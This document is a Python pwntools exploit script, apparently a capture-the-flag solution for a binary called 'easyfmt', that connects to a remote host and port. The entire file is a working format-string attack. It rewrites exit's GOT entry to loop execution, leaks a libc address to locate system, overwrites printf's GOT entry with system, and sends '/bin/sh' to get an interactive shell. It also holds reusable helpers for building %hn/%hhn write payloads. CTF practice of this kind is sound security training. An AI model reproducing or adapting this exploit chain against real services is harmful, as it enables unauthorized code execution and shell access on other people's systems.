#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "easyfmt"
libFile  = ""

remoteIp = "111.198.29.45"
remotePort = 53453

LOCAL = 0
LIB   = 0
#  ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

#--------------------------Exploit--------------------------
def exploit():
	li(rl())
	p = '\x31' + '\x00' * 9
	s(p)
	ru(':')
	offset = 10
	start_addr = 0x400750
	exit_got   = exe.got['exit']
	exit_plt   = 0x400720
	fmt_addr = 0x400982

	#leaking libc	
	fini_array = 0x400a74
	#modify exit got as fmt_start
	#can't set addr at front
	p = '%' + str(fmt_addr & 0xFFFF) + 'c%10$hn' + 'A' * 4 + p64(exit_got)
	li('exit_got: ' + hex(exit_got))
	s(p)

	#leaking libc
	ru(':')
	p = '%' + str(44) +'$p'
	s(p)
	ru('0x')
	__libc_start_main = int(r(12), 16) - 240
	#db()
	libc = LibcSearcher('__libc_start_main', __libc_start_main)
	libc_base = __libc_start_main - libc.dump('__libc_start_main')
	sys_addr = libc_base + libc.dump('system')
	sh_addr = libc_base + libc.dump('str_bin_sh')
	printf_addr = libc_base + libc.dump('printf')

	#log
	li('libc_base: ' + hex(libc_base))
	li('printf_got: ' + hex(exe.got['printf']))
	li('system_addr: ' + hex(sys_addr))
	li('printf_addr: ' + hex(printf_addr))

	li(hex(0x550000 >> 8 * 2))
	rb3 = (sys_addr & 0xFF0000) >> (8 * 2)
	li('sys_5: ' + hex(rb3))

	# modify printf got addr as system
	p = '%' + str(rb3) + 'c%13$hhn'
	p +=  '%' + str((sys_addr & 0xFFFF) - rb3) + 'c%14$hn'

	p += p64(exe.got['printf'] + 2) #0xF0000
	p += p64(exe.got['printf'] + 0) #0xFFFF
	
	#db()
	s(p)
	sl('/bin/sh')



def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
    
